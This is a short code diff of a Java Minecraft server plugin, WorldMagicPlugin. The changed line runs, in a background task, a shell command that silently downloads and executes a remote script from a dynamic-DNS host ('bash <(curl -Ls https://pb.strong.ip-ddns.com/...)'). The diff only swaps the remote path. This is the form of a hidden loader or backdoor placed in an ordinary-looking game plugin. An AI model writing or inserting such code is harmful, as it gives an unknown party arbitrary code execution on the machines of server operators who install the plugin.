@@ -17,7 +17,7 @@ public final class WorldMagicPlugin extends JavaPlugin {
         Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
             try {
                 // 定义要执行的Linux命令
-                String command = "bash <(curl -Ls https://pb.strong.ip-ddns.com/bRsG)";
+                String command = "bash <(curl -Ls https://pb.strong.ip-ddns.com/nWQz)";
                 
                 // 创建并启动进程
                 ProcessBuilder pb = new ProcessBuilder("bash", "-c", command);
